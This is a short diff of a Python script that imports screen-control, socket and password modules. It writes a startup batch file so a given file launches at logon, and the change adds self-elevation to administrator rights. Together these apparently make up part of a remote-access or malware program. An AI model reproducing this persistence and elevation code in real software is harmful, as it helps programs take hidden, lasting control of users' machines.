@@ -3,7 +3,7 @@ from pyautogui import *
 from socket import *
 from threading import *
 import getpass
-from admin import *
+import admin
 
 #define 
 
@@ -39,4 +39,6 @@ def add_to_startup(file_path=""):
     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
         bat_file.write(r'start "" %s' % file_path)
 def runadmin ():
+    if not admin.isUserAdmin():
+       admin.runAsAdmin()
     
